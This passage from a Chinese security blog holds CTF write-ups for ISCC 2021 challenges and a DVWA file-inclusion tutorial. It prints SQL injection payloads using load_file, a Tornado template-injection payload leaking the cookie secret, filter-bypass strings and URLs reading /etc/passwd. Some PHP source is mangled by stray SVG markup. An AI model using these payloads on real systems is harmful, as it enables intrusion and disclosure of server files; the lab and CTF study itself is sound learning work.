</g>
</svg>_GET[‘c’];</p>
<pre><code>if(preg_match(&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;, $c))&#123;
   exit(&quot;die!!&quot;);
&#125;else&#123;
 echo `$c`;
&#125;
</code></pre>
<p>}else{<br>    highlight_file(<strong>FILE</strong>);<br>}<br>?&gt;</p>
<!--flllllllllaaag.php-->`

<p>似乎没什么发现，26个英文字母表对比一下上述的英文字符<code>zxcvbMnlkjhgfsaoiuytreq</code><br>发现没被过滤的字母有<code>dmpw</code>，执行pwd获取文件路径，<br>获取flag位置，使用load_file()方法<br><code>?id=0&#39;%0dununionion%0dseselectlect%0d1,(load_file(&#39;/var/www/const/flllllllllaaag.php&#39;)),3%0d%23</code></p>
<p><img  src="https://img-blog.csdnimg.cn/20210524201553249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>或者是<br><code>?id=-1&#39;%0duniunionon%0dselselectect%0d1,(load_file(&#39;/etc/apache2/sites-available/000-default.conf&#39;)),3%23    //此路径为默认</code><br>获取网站路径</p>
<p><img  src="https://img-blog.csdnimg.cn/20210524201824466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>在源代码中查看flag<img  src="https://img-blog.csdnimg.cn/20210524201859455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><img  src="https://img-blog.csdnimg.cn/20210524202657707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>进入三个路径的文件，发现flag.txt中flag在/fllllllllllllaaaaaag中；<br>welcome.txt中提示<code>render函数</code>，百度一下存在render函数的模板注入；<br>hints.txt告诉我们<code>md5(cookie_secret+md5(filename))</code> 发现我们需要进行md5</p>
<p>查看hints.txt的路径</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//39.96.91.106:7060/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15</span><br></code></pre></td></tr></table></figure>
<p>有filehash参数，根据所给出的提示filehasc的值是MD5处理，有了filehash还需要有cookie_secret这一步可以参考之前的题型，有大佬做出明确解释<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45836474/article/details/107940521">看这里</a><br>构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">error</span>?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210524204816774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到cookie_secret,计算hash值<br>拿到大佬脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5encode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    m = hashlib.md5()<br>    m.update(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span> m.hexdigest()<br><br><br>name = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>secret = <span class="hljs-string">&#x27;ef57c331-744f-4528-b434-9746317d4f6a&#x27;</span><br>name = name.encode()<br>bb = md5encode((secret + md5encode(name)).encode())<br>print(bb)<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210524210129226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h2><p><img  src="https://img-blog.csdnimg.cn/20210525192159628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>010Editor打开<img  src="https://img-blog.csdnimg.cn/20210525192713781.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure>
<p>尝试了一下，有点像敲击码<img  src="https://img-blog.csdnimg.cn/20210525192919472.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>最后得到flag:<code>ISCCBFS</code></p>
<h2 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h2><p>打开文档没什么有用的东西，把文档改成zip形式</p>
<p><img  src="https://img-blog.csdnimg.cn/20210525193328667.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>点进去查找flag<img  src="https://img-blog.csdnimg.cn/20210525193419869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h2><p>打开文件，一张图片格式找到提示信息<br><img  src="https://img-blog.csdnimg.cn/20210525193957889.png"  ><span class="image-caption">在这里插入图片描述</span><br>很显然这是AES加密,密匙是ISCC2021<br>打开文档里面有一张二维码，扫描得到信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu <span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu +CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE +pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br></code></pre></td></tr></table></figure>
<p>进行三次解密得到字符：<code>y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!</code></p>
<p>很是让人头大！！<br>试着将word文档改为压缩包，在ny4w1nbmry4m.zip\word\media中看到了两张image<br>其中一个就是那张二维码，还有另一张二维码，扫描出结果是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210525194416299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>但是，进行AES解密失败，所以尝试了DES，即可得到flag<img  src="https://img-blog.csdnimg.cn/20210525194712905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="我的折扣是多少"><a href="#我的折扣是多少" class="headerlink" title="我的折扣是多少"></a>我的折扣是多少</h2><p>下载好文件后，运行exe文件得到一串编码<img  src="https://img-blog.csdnimg.cn/20210525195521957.png"  ><span class="image-caption">在这里插入图片描述</span><br><code>pass1&#123;\u006b\u0072\u0077&#125;</code>，Unicode编码，解码后为<code>pass1&#123;krw&#125;</code><br>在010Editor打开压缩包在尾部发现<img  src="https://img-blog.csdnimg.cn/20210525195735180.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cGFzczJ7Z2NjNjY2fQ==<br></code></pre></td></tr></table></figure>
<p>进行base64编码得到：pass2{gcc666}<br>组合起来用密码：krwgcc666解开压缩包<img  src="https://img-blog.csdnimg.cn/2021052519595244.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure>
<p>base64解出来是：youfoundme?<br>接下来还剩一个MP3格式的文件MP3一般都是用MP3stego解密，接出来密码是youfoundme?<br>得到<code>ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU======&#125;</code></p>
<p>进行base32解密<br><img  src="https://img-blog.csdnimg.cn/2021052520020990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="检查一下"><a href="#检查一下" class="headerlink" title="检查一下"></a>检查一下</h2><p>解压后是一张图片，尝试进行binwalk进行分离<img  src="https://img-blog.csdnimg.cn/2021052520124651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>解压后的文件，发现有一个文档打开后01的字符串<img  src="https://img-blog.csdnimg.cn/20210525201451663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>联想到是01字符串画二维码<br>先看下字符串长度发现是841，而正好是29的平方，那应该就是二维码了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">29</span>    <span class="hljs-comment">#宽高 841个01字符串，所以宽和高是29</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-comment">#若是(255,255,255)、(0,0,0)需要先转换01 </span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;./flag.png&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>得到二维码扫描<br><img  src="https://img-blog.csdnimg.cn/20210525201635774.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="小明的宠物图"><a href="#小明的宠物图" class="headerlink" title="小明的宠物图"></a>小明的宠物图</h2><p>下载后是一张图片<img  src="https://img-blog.csdnimg.cn/20210525201858964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>用binwalk分离图片得到flag.txt和key.zip<br>flag.txt中内容为<code>U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==</code><br>显然需要密钥解密<img  src="https://img-blog.csdnimg.cn/20210525202033954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>打开key.zip发现其中的key.txt只有5字节大小，结合那个兔子说的它需要碰撞应该是crc32碰撞，尝试发现(0_0)为密钥<img  src="https://img-blog.csdnimg.cn/20210525203843687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="小明的表情包"><a href="#小明的表情包" class="headerlink" title="小明的表情包"></a>小明的表情包</h2><p><img  src="https://img-blog.csdnimg.cn/20210525204154640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到这是凯撒解密，但是偏移量是未知的，通过枚举：发现偏移量为：13时是英文日期，加上提示，年月日可以想到1999，但是月份和日期没有，都是数字，字节为8位可以使用Ziperello进行爆破</p>
<p><img  src="https://img-blog.csdnimg.cn/20210525204457701.png"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210525204847759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到密码：07071999<br>然后打开文件时不支持的，所以在winhex中查看，发现它的文件头缺失了，然后补充好，得到图片<img  src="https://img-blog.csdnimg.cn/20210525204930614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><p><img  src="https://img-blog.csdnimg.cn/20210523200240718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>==可以直接进行改票，但是会被检测到刷票行为==<br><img  src="https://img-blog.csdnimg.cn/20210523200541210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>既然不发进行刷票，那就直接把对方的投票按钮给他关闭！<br>我们可以通过火狐浏览器<strong>F12</strong>进入开发者模式，对源码进行修改直接讲对方的投票按钮删除😼<br><img  src="https://img-blog.csdnimg.cn/2021052320100128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210523201022881.png"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到对方以及在五六十票左右，因此我们需要进入后快速开发者模式，修改后在20s内点到票数超过对方就好了</p>
<p><img  src="https://img-blog.csdnimg.cn/20210523200400127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><p>查看源码，发现这是一段JS代码，直接复制代码放到控制台运行<br><img  src="https://img-blog.csdnimg.cn/20210523201256146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210523201420984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h2><p>根据提示进去看一下<br><img  src="https://img-blog.csdnimg.cn/20210523201727633.png"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210523201814245.png"  ><span class="image-caption">在这里插入图片描述</span><br>这倔强的小脾气，摆明让我们进去看看😏😏<br><code>39.96.91.106:7040/code/code.txt</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br>	<span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.617ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 1557.3 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">/", </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMAIN-2F" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-22" x="778" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1278" y="0"></use>
</g>
</svg>_GET[&#x27;password&#x27;]) === FALSE)</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;</span><br><span class="hljs-string">	</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">	  else if (strlen($_GET['password']) < 8 && $_GET[&#x27;password&#x27;] &gt; 9999999)</span><br><span class="hljs-string">	&#123;    </span><br><span class="hljs-string">    </span><br><span class="hljs-string">		if (strpos (<span class="hljs-subst">$_GET</span>[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE)</span><br><span class="hljs-string">		&#123;</span><br><span class="hljs-string">			die(&#x27;Flag: &#x27; . <span class="hljs-subst">$flag</span>);</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">		else</span><br><span class="hljs-string">		&#123;</span><br><span class="hljs-string">			echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;);</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">	else</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>对源码进行审计后发现了出题人的小秘密<img  src="https://img-blog.csdnimg.cn/20210523202302371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到要求输入的密码必须<strong>小于八位并且数值大于9999999</strong>并且最后要加上<code>*-*</code><br>根据科学计数法1e9=1000000000&gt; 9999999<br>因此构造<br><strong><code>payload:1e9*-*</code></strong></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/DVWA%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%EF%BC%88%E4%B8%AD%E3%80%81%E9%AB%98%E7%BB%95%E8%BF%87%EF%BC%89/">DVWA文件包含漏洞-（中、高绕过）</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.960Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="一、DVWA-SecurityMedium級別"><a href="#一、DVWA-SecurityMedium級別" class="headerlink" title="一、DVWA SecurityMedium級別"></a>一、DVWA SecurityMedium級別</h1><p>设置好难度后，查看源码：<img  src="https://img-blog.csdnimg.cn/2021052315344968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>通过对代码分析可以发现这里过滤了一些东西，即是<code>array</code>里面的因此我们需要进行绕过</p>
<p><strong>绕过方法</strong></p>
<ol>
<li><p>使用绝对路径或相对路径进行绕过，在这里与低级别中路径一致</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/DVWA-master/vulnerabilities/fi/?page=/etc/passwd</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210523161323887.png"  ><span class="image-caption">在这里插入图片描述</span></p>
</li>
<li><p>使用的是 <code>str_replace() 函数</code>，可以使用重写的方式绕过或者是掺入大小写进行绕过</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1.</span> htthttp:<span class="hljs-comment">//p://</span><br><span class="hljs-number">2.</span> http:<span class="hljs-comment">//..././</span><br><span class="hljs-number">3.</span> ../<br></code></pre></td></tr></table></figure>
<h1 id="二、High-Security-Level"><a href="#二、High-Security-Level" class="headerlink" title="二、High Security Level"></a>二、High Security Level</h1><p>查看源码：<br><img  src="https://img-blog.csdnimg.cn/20210523154828740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看出，报错的条件：</p>
<ol>
<li>传出的<code>page</code>中没有<code>file*</code></li>
<li>$file不等于<code>Include.php</code></li>
</ol>
<p><strong>绕过方法：</strong></p>
<ol>
<li>可以使用伪协议进行绕过:<code>file://</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/DVWA-master/vulnerabilities/fi/?page=file:///etc/passwd</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210523160332867.png"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/mysql-IN%E5%92%8CLIKE%E7%9A%84%E4%BD%BF%E7%94%A8/">mysql-IN和LIKE的使用</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.959Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
